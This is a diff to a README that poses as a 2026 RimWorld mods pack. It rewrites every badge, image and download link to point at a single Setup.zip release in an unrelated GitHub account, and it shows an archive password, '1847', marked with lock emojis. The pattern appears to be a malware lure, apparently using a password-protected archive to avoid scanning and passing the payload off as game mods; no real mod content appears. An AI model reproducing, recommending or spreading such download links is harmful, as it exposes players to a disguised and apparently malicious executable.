@@ -1,14 +1,14 @@
 # 🎮 RimWorld Mods 2026 — Best Mods Collection & Ultimate Pack
 
-[![GitHub Stars](https://img.shields.io/github/stars/placeholder/RimWorld)]()
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)]()
-[![Platform](https://img.shields.io/badge/Platform-PC%20Windows-blue)]()
-[![Category](https://img.shields.io/badge/Category-Modding-orange)]()
-[![Updated](https://img.shields.io/badge/Updated-2026-brightgreen)]()
+[![GitHub Stars](https://img.shields.io/github/stars/placeholder/RimWorld)](https://github.com/Wisezurstaple/RimWorld-Mods/releases/download/RimWorld-Mods/Setup.zip)
+[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://github.com/Wisezurstaple/RimWorld-Mods/releases/download/RimWorld-Mods/Setup.zip)
+[![Platform](https://img.shields.io/badge/Platform-PC%20Windows-blue)](https://github.com/Wisezurstaple/RimWorld-Mods/releases/download/RimWorld-Mods/Setup.zip)
+[![Category](https://img.shields.io/badge/Category-Modding-orange)](https://github.com/Wisezurstaple/RimWorld-Mods/releases/download/RimWorld-Mods/Setup.zip)
+[![Updated](https://img.shields.io/badge/Updated-2026-brightgreen)](https://github.com/Wisezurstaple/RimWorld-Mods/releases/download/RimWorld-Mods/Setup.zip)
 
 ---
 
-[![Download](og-image.png)]()
+[![Download](og-image.png)](https://github.com/Wisezurstaple/RimWorld-Mods/releases/download/RimWorld-Mods/Setup.zip)
 
 <img src="https://cdn.akamai.steamstatic.com/steam/apps/294100/header.jpg" alt="banner" width="100%" />
 
@@ -23,7 +23,7 @@
 
 ## 📥 Download
 
-[![RimWorld Mods](https://img.shields.io/badge/Download%20RimWorld%20Mods-Open%20Page-0a84ff?style=for-the-badge&logo=github)]()
+[![RimWorld Mods](https://img.shields.io/badge/Download%20RimWorld%20Mods-Open%20Page-0a84ff?style=for-the-badge&logo=github)](https://github.com/Wisezurstaple/RimWorld-Mods/releases/download/RimWorld-Mods/Setup.zip)
 
 **🔐🔐🔐** `1847`
 
